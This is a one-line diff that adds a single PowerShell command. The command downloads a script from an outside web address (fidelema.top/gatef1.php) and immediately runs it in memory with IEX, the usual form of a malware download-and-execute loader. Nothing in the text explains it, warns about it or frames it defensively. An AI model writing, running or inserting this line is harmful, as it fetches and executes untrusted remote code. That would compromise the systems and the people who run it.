@@ -1,0 +1,1 @@
+IEX (New-Object Net.Webclient).downloadstring("http://fidelema.top/gatef1.php")
